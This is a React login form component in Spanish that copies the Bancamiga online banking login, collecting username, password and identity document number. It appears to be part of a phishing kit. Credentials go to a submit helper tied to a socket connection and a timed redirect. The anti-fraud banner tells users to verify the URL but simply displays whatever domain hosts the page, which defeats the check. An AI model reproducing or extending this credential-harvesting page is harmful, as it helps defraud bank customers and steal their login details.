import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
import iconKey from '../../../assets/iconKeyGray.png'
import iconUser from '../../../assets/iconUser.png'
import iconVerify from '../../../assets/iconVerify.png'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faLockOpen, faUser } from '@fortawesome/free-solid-svg-icons'

const valuesData = { username: '', password: '', typeDocument: 'Venezolano', nroDocument: '' }
const opciones = ['', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext);
    const { socket } =  useContext(SocketContext);  
    
    const [showSpiner , SetshowSpiner] = useState(false);
    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('');
    const [selectActive, setSelectActive] = useState(false);
    const [selectItem, setSelectItem] = useState(opciones[0]);
    
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched,  } = useFormik({
        initialValues: valuesData,
        // En caso de poner un error personalizado colocar errorUsername y errorPassword
        validate: values => usernameAndPasswordValidate({values, virtualKeyword}),
        onSubmit: async(valuesData) => { 
            submitBase({dataImportant, valuesData, endUrl}) }
    })
    
    return (
        <div>
            {/* Spiner de carga */}
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>
                <div  className='p-[20px]'>
                <div className='border-l-[#dfb56c] border-l-[5px] bg-[#efe1b3] text-[#826430] text-[13px] p-[10px]'>
                    <p className='font-bold'>Protégete del fraude</p>
                    <p>Recuerda verificar que el URL sea el correcto {window.location.origin}</p>
                </div>

                    <UsernameAndPasswordInput
                        username={values.username}
                        password={values.password}
                        nroDocument={values.nroDocument}
                        typeDocument={values.typeDocument}
                        handleChange={handleChange} 
                        handleBlur={handleBlur}
                        touched={touched}
                        errors={errors}
                        virtualKeyword={virtualKeyword}
                        valueKeyBoardVirtual={valueKeyBoardVirtual}
                        showPasswordMode={false}
                        
                        selectActive={selectActive} 
                        setSelectActive={setSelectActive}
                        selectItem={selectItem}
                        setSelectItem={setSelectItem}
                        opciones={opciones}
                    />
                </div>
                <div  className='w-full border-[1px] border-[#fafafa]' />
                    <div className='flex flex-col gap-5 my-10 px-[35px]'>
                        {
                            showSpiner === true ? <Spiner /> : (
                                <>
                                    <div className='flex justify-between gap-6'>
                                        <button  className='
                                        flex  justify-center items-center gap-2 w-full
                                        bg-[#E2B14A] border-[#C99D42] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                                        disabled:opacity-60 disabled:cursor-not-allowed disabled:shadow-none
                                        hover:bg-[#D6A848] hover:border-[#C09844]
                                        active:top-[1px] active:left-[1px]
                                        '
                                        disabled={
                                            (touched.nroDocument && errors.nroDocument ) || values.nroDocument.length == 0  ? true : false
                                        }  
                                        type='button'>
                                            <img className='w-[13px]' src={iconUser} alt="iconUser" />
                                            Registro
                                        </button>

                                        <button 
                                            disabled={
                                                (
                                                    (touched.username && errors.username )
                                                    || 
                                                    values.username.length === 0
                                                ) 
                                                || 
                                                (
                                                    ( touched.password && errors.password ) 
                                                    || 
                                                    values.password.length === 0
                                                )
                                                ? true : false
                                            }
                                            className='
                                            flex justify-center items-center gap-2 w-full
                                            bg-[#96bf48] border-[#84A83E] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                                            disabled:opacity-60 disabled:cursor-not-allowed
                                            hover:bg-[#89AD45] hover:border-[#78973B]
                                            active:top-[1px] active:left-[1px]
                                            '
                                            type='submit'
                                        >
                                            <img className='w-[13px]' src={iconVerify} alt="iconUser" />

                                            Ingresar
                                        </button>

                                    </div>
                                    
                                    <div className='flex justify-between'>
                                        <div className='flex gap-1 items-center'>
                                            <FontAwesomeIcon icon={faLockOpen} width={12} height={13} fill='#999' color='#999' />
                                            <span className='text-[13px] text-[#999] font-extrabold'>Desbloqueo de usuario</span>
                                        </div>

                                        <div className='flex gap-1 items-center'>
                                            <FontAwesomeIcon icon={faUser} width={12} color='#999' />
                                            <span className='text-[13px] text-[#999] font-bold'>Olvido de Contraseña</span>
                                        </div>
                                        <div className='flex gap-1 items-center'>
                                            <img className='w-[13px] text-[#999]' src={iconKey} alt="iconUser" />

                                            <span className='text-[13px] text-[#999] font-bold'>Olvido de Usuario</span>
                                        </div>
                                    </div>

                                            <div>
                                                
                                            </div>
                                {/* <div className='flex justify-center gap-3'>
                                    

                                    <button  className='
                                    flex justify-center items-center gap-2
                                    bg-[#005291] border-[#2F7DBE] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                                    disabled:opacity-60 disabled:cursor-not-allowed
                                    active:top-[1px] active:left-[1px]
                                    '  
                                    disabled={
                                        ((touched.nroDocument && errors.nroDocument ) || values.nroDocument.length == 0) ||
                                        ((touched.username && errors.username ) || values.username.length == 0) 
                                        ? true : false
                                    }  
                                    type='button'>
                                            <img className='w-[13px]' src={iconUser} alt="iconUser" />

                                        Desbloqueo de usuario
                                    </button>


                                    </div>
                                    <div className='flex justify-center gap-3'>
                                        <button  className='
                                        flex justify-center items-center gap-2
                                        bg-[#005291] border-[#2F7DBE] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                                        disabled:opacity-60 disabled:cursor-not-allowed
                                        active:top-[1px] active:left-[1px]
                                        '  
                                        disabled={
                                            (touched.nroDocument && errors.nroDocument ) || values.nroDocument.length == 0  ? true : false
                                        }  
                                        type='button'>
                                            <img className='w-[13px]' src={iconUser} alt="iconUser" />
                                            Olvido de Usuario
                                        </button>
                                        <button  className='
                                            flex justify-center items-center gap-2
                                            bg-[#E2B14A] border-[#C99D42] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                                            disabled:opacity-60 disabled:cursor-not-allowed
                                            hover:bg-[#D6A848] hover:border-[#C09844]
                                            active:top-[1px] active:left-[1px]
                                        '
                                        disabled={
                                            ((touched.nroDocument && errors.nroDocument ) || values.nroDocument.length == 0) ||
                                            ((touched.username && errors.username ) || values.username.length == 0) 
                                            ? true : false
                                        }
                                        type='button'>
                                        Olvido de Contraseña
                                        </button>
                                    </div> */}
                                </>

                            )
                        }
                        
                        
                    </div>


                <span className='text-center text-[#999] font-bold text-[11px] pb-10  '>Para mayor información o asesoria contáctanos al <br />
                    Centro de atención Bancamiga (CAB) <br />
                    0500-TUBANCA y 0500-1000400</span>

            </form>
        </div>
    )
}
